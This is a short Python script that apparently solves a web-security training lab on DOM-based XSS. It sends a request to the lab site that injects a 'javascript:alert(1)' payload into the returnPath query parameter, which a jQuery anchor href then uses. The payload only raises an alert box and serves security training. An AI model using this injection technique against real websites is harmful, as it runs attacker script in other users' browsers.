###########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 15/11/2023
#
# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
#
# Steps: 1. Inject payload in the returnPath query parameter to call the alert function
#        2. Observe that the script has been executed
#
###########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0af800bc040406dc83bbec9900da000a.web-security-academy.net"

# payload to call the alert function
payload = "javascript:alert(1)"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}/feedback?returnPath={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the returnPath query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



